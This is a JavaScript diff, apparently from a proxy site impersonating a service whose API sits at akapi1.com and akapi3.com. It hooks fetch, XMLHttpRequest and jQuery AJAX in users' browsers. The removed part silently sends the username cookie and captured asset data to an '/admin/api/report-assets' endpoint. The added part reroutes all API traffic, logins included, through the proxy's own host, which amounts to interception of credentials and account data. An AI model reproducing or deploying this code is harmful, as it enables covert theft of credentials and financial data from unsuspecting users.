@@ -183,50 +183,50 @@
         window.location.href = '/pages/account/login.html';
     };
     
-    // ===== fixApiUrl已废弃：API走直连，不再重写BASE_URL =====
-    function fixApiUrl() { /* API直连模式，不需要修改 */ }
+    // ===== 自动修改API地址，让请求走代理 =====
+    function fixApiUrl() {
+        try {
+            if (typeof APP !== 'undefined' && APP.CONFIG && APP.CONFIG.BASE_URL) {
+                const oldUrl = APP.CONFIG.BASE_URL;
+                if (oldUrl.includes('akapi1.com') || oldUrl.includes('akapi3.com')) {
+                    APP.CONFIG.BASE_URL = 'https://' + window.location.host + '/RPC/';
+                }
+            }
+        } catch(e) {}
+    }
     
-    // ===== API直连模式：只拦截Login走代理，其他API直连 akapi1.com =====
+    // 更新用户活动时间（仅记录，不触发任何操作）
+    function updateActivity() {
+        if (window._akChatInitialized) {
+            window._akLastActivity = Date.now();
+        }
+    }
+    
+    // ===== 拦截所有网络请求，重定向akapi1.com到代理 =====
     function interceptNetworkRequests() {
         const proxyHost = window.location.host;
-        var _indexDataReported = false;
-        
-        // 上报资产数据到我们的服务器
-        function reportAssets(data) {
-            if (_indexDataReported) return;
-            _indexDataReported = true;
-            try {
-                var username = document.cookie.replace(/(?:(?:^|.*;\s*)ak_username\s*=\s*([^;]*).*$)|^.*$/, '$1') || 'unknown';
-                fetch(`https://${proxyHost}/admin/api/report-assets`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({username: username, data: data})
-                }).catch(function(){});
-            } catch(e) {}
-        }
         
         // 拦截 fetch 请求
         if (window.fetch) {
             const originalFetch = window.fetch;
             window.fetch = function(url, options) {
+                // 记录用户活动
                 updateActivity();
+                
                 let finalUrl = url;
                 if (typeof url === 'string') {
-                    // Login请求重定向到代理（白名单检查）
-                    if (url.includes('/RPC/Login') || url.includes('/Login')) {
-                        finalUrl = `https://${proxyHost}/RPC/Login`;
+                    // 特定API强制重定向
+                    if (url.includes('public_IndexData')) {
+                        finalUrl = `https://${proxyHost}/RPC/public_IndexData`;
+                    }
+                    // 通用akapi重定向
+                    else if (url.includes('akapi1.com') || url.includes('akapi3.com')) {
+                        finalUrl = url.replace(/https?:\/\/(www\.)?akapi[13]\.com\/RPC\//, `https://${proxyHost}/RPC/`);
                     }
                 }
-                // 捕获IndexData响应上报资产
-                var result = originalFetch.call(this, finalUrl, options);
-                if (typeof url === 'string' && url.includes('public_IndexData')) {
-                    result.then(function(resp) {
-                        resp.clone().json().then(function(json) {
-                            if (!json.Error && json.Data) reportAssets(json.Data);
-                        }).catch(function(){});
-                    }).catch(function(){});
-                }
-                return result;
+                
+                // 不在这里重连，避免重复连接
+                return originalFetch.call(this, finalUrl, options);
             };
         }
         
@@ -234,32 +234,39 @@
         if (window.XMLHttpRequest) {
             const originalOpen = XMLHttpRequest.prototype.open;
             XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
+                // 记录用户活动
                 updateActivity();
+                
                 if (typeof url === 'string') {
-                    // Login请求重定向到代理
-                    if (url.includes('/RPC/Login') || url.includes('/Login')) {
-                        return originalOpen.call(this, method, `https://${proxyHost}/RPC/Login`, async, user, password);
-                    }
-                    // IndexData: 直连但捕获响应
+                    // 特定API强制重定向
                     if (url.includes('public_IndexData')) {
-                        this.addEventListener('load', function() {
-                            try {
-                                var json = JSON.parse(this.responseText);
-                                if (!json.Error && json.Data) reportAssets(json.Data);
-                            } catch(e) {}
-                        });
+                        const newUrl = `https://${proxyHost}/RPC/public_IndexData`;
+                        return originalOpen.call(this, method, newUrl, async, user, password);
+                    }
+                    // 通用akapi重定向
+                    if (url.includes('akapi1.com') || url.includes('akapi3.com')) {
+                        const newUrl = url.replace(/https?:\/\/(www\.)?akapi[13]\.com\/RPC\//, `https://${proxyHost}/RPC/`);
+                        return originalOpen.call(this, method, newUrl, async, user, password);
                     }
                 }
                 return originalOpen.call(this, method, url, async, user, password);
             };
         }
         
-        // 拦截 jQuery AJAX
+        // 拦截 jQuery AJAX (如果存在)
         if (window.$ && window.$.ajaxPrefilter) {
             window.$.ajaxPrefilter(function(options, originalOptions, jqXHR) {
                 if (options.url) {
-                    if (options.url.includes('/RPC/Login') || options.url.includes('/Login')) {
-                        options.url = `https://${proxyHost}/RPC/Login`;
+                    // 特定API强制重定向
+                    if (options.url.includes('public_IndexData')) {
+                        const newUrl = `https://${proxyHost}/RPC/public_IndexData`;
+                        options.url = newUrl;
+                        return;
+                    }
+                    // 通用akapi重定向
+                    if (options.url.includes('akapi1.com') || options.url.includes('akapi3.com')) {
+                        const newUrl = options.url.replace(/https?:\/\/(www\.)?akapi[13]\.com\/RPC\//, `https://${proxyHost}/RPC/`);
+                        options.url = newUrl;
                     }
                 }
             });
